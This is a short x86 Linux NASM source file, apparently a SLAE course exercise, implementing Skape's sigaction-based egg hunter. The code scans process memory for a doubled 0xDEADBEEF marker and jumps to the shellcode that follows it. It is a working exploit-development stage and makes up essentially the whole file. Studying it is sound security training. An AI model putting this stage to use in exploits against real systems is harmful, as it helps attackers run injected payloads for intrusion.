; Filename: EggHunter.nasm
; Author  : Andrea Perfetti
; SLAE ID : SLAE - 1547
;
; Egghunter code taken from paper
; "Safely Searching Process Virtual Address Space"
; by Skape, 09/03/2004
; Linux implementation with 'sigaction(2)'

global _start

section .text

_start:
	nop
	xor ecx, ecx

next_page:
	or cx,0xfff

next_addr:
	inc ecx
	push byte +0x43
	pop eax
	int 0x80
	cmp al,0xf2
	jz next_page

	mov eax,0xDEADBEEF
	mov edi,ecx
	scasd
	jnz next_addr

	scasd
	jnz next_addr

	jmp edi